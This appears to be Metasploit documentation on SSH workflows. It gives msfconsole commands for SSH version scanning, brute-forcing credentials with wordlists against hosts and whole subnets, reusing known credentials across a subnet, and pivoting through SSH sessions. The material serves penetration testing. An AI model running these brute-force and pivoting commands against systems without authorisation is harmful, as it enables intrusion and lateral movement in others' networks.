## SSH Workflows

SSH, also known as Secure Shell or Secure Socket Shell, is frequently found on port 22/TCP. The protocol allows for SSH clients to securely connect to a running SSH server to execute commands against, the protocol also supports tunneling network traffic - which Metasploit can leverage for pivoting purposes.

Metasploit has support for multiple SSH modules, including:

- Version enumeration
- Verifying/bruteforcing credentials
- Opening sessions
- Pivoting support

There are more modules than listed here, for the full list of modules run the `search` command within msfconsole:

```
msf6 > search ssh
```

### SSH Enumeration

Enumerate SSH version:

```
use auxiliary/scanner/ssh/ssh_version
run ssh://127.0.0.1
```

### SSH Bruteforce

Brute-force host with known user and password list:

```
use scanner/ssh/ssh_login
run ssh://known_user@192.168.222.1 threads=50 pass_file=./wordlist.txt
```

Brute-force credentials:

```
use scanner/ssh/ssh_login
run ssh://192.168.222.1 threads=50 user_file=./users.txt pass_file=./wordlist.txt
```

Brute-force credentials in a subnet:

```
use scanner/ssh/ssh_login
run cidr:/24:ssh://user:pass@192.168.222.0 threads=50
run cidr:/24:ssh://user@192.168.222.0 threads=50 pass_file=./wordlist.txt
```

### SSH Login

If you have valid SSH credentials the `ssh_login` module will open a Metasploit session for you:

```
use scanner/ssh/ssh_login
run ssh://user:pass@172.18.102.20
```

Re-using SSH credentials in a subnet:

```
use scanner/ssh/ssh_login
run cidr:/24:ssh://user:pass@192.168.222.0 threads=50
```

Using an alternative port:

```
use scanner/ssh/ssh_login
run ssh://user:pass@192.168.123.6:2222
```

### SSH Pivoting

Like Meterpreter, it is possible to [port forward through a Metasploit SSH session](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/ssh/ssh_login.md#session-capabilities):

```
route add 172.18.103.0/24 ssh_session_id
```

To a route for the most recently opened Meterpreter session:

```
route add 172.18.103.0/24 -1
```
